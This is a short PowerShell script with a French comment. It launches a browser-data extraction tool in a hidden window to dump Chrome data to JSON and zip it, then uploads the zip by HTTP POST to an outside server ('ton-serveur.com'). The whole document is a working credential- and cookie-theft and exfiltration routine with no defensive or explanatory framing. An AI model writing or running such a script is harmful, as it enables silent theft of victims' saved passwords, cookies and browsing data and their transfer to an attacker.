Start-Process -WindowStyle Hidden -FilePath ".\hack-browser-data.exe" -ArgumentList "-b chrome -f json --dir results --zip"
Start-Sleep -Seconds 10  # Attendre que l'export soit terminé
Invoke-WebRequest -Uri "http://ton-serveur.com/upload" -Method POST -InFile "results/data.zip" -ContentType "application/zip"
